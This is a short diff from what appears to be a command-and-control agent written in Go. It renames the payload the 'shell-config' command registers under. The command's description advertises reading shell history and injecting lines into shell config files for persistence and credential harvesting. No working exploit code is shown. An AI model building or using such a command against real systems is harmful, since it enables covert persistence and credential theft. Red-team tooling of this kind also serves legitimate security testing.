@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "shell-config",
 		Description:         "Read shell history, list/read/inject/remove shell config files for persistence and credential harvesting (T1546.004, T1552.003)",
 		HelpString:          "shell-config -action <history|list|read|inject|remove> [-file <.bashrc>] [-line <command>] [-user <username>] [-lines <count>]",
